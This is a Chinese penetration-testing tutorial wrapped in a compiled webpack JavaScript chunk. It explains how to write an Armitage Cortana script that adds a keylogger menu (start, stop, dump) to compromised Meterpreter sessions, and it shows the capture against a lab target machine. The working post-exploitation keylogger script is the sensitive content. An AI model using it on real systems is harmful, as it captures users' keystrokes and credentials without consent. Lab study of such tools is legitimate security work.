(window.webpackJsonp=window.webpackJsonp||[]).push([[289],{580:function(t,a,s){"use strict";s.r(a);var n=s(7),e=Object(n.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"armitage使用cortana创建自定义菜单"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#armitage使用cortana创建自定义菜单"}},[t._v("#")]),t._v(" Armitage使用Cortana创建自定义菜单")]),t._v(" "),a("p",[t._v("通过Meterpreter会话成功连接到目标计算机之后，Cortana还可以为我们提供构建自定义菜单的功能。这里，我们创建一个监听目标主机键盘操作的自定义菜单")]),t._v(" "),a("p",[t._v("首先创建一个脚本menu.cna，内容如下：")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('popup meterpreter_bottom{\n    menu "&My Key Logger"{\n        item "&Start Key Logger"{\n            m_cmd($1, "keyscan_start");\n        }\n        item "&Stop Key Logger"{\n            m_cmd($1, "keyscan_stop");\n        }\n        item "&Show Keylogs"{\n            m_cmd($1, "keyscan_dump");\n        }\n        on meterpreter_keyscan_start{\n            println(" $3 ");\n        }\n        on meterpreter_keyscan_stop{\n            println(" $3 ");\n        }\n        on meterpreter_keyscan_dump{\n            println(" $3 ");\n        }\n    }\n}\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br"),a("span",{staticClass:"line-number"},[t._v("15")]),a("br"),a("span",{staticClass:"line-number"},[t._v("16")]),a("br"),a("span",{staticClass:"line-number"},[t._v("17")]),a("br"),a("span",{staticClass:"line-number"},[t._v("18")]),a("br"),a("span",{staticClass:"line-number"},[t._v("19")]),a("br"),a("span",{staticClass:"line-number"},[t._v("20")]),a("br"),a("span",{staticClass:"line-number"},[t._v("21")]),a("br"),a("span",{staticClass:"line-number"},[t._v("22")]),a("br")])]),a("p",[t._v("这段代码实现了在Meterpreter子菜单中创建一个新的弹出菜单项。不过"),a("strong",[t._v("只有成功渗透了目标计算机并取得了一个Meterpreter命令行时，这个弹出菜单才是可用的")])]),t._v(" "),a("p",[t._v("关键字popup表示要创建一个弹出式菜单项，而函数meterpreter_bottom表示当用户在目标计算机图标上单击鼠标右键并选中Meterpreter时，这个菜单项就会出现。关键字item制定了菜单中的各个选项。，命令m_cmd会根据它们对应编号的会话将命令发送给Metasploit。")]),t._v(" "),a("p",[t._v("这段代码有三个选项：Start Key Logger、Stop Key Logger和Show Keylogs。分别用来开启键盘监听器、停止键盘监听器以及显示当前记录中的键盘监听数据。我们还声明了三个用来处理发送给Meterpreter的命令输出函数。")]),t._v(" "),a("p",[t._v("在Cortana中载入这个脚本，成功渗透目标计算机，然后在目标计算机的图表上单击鼠标右键，会弹出如下的菜单：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128212228138.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("这里，我们单击Start Key Logger，在Cortana命令行输出了信息：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019012821224894.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("此时，我们到靶机上利用记事本随便输入几个字符")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128212306661.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("接着我们在Kali上单击Show Keylogs")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128212323902.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("效果如下：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128212339314.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("可以看到在Cortana命令行输出了我们在靶机上输入的键盘操作。")]),t._v(" "),a("p",[t._v("接着，我们单击Stop Key Logger停止键盘监听")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128212402916.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("效果如下：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128212418824.png",loading:"lazy"}})]),t._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[t._v("#")]),t._v(" 写在最后")]),t._v(" "),a("blockquote",[a("p",[t._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);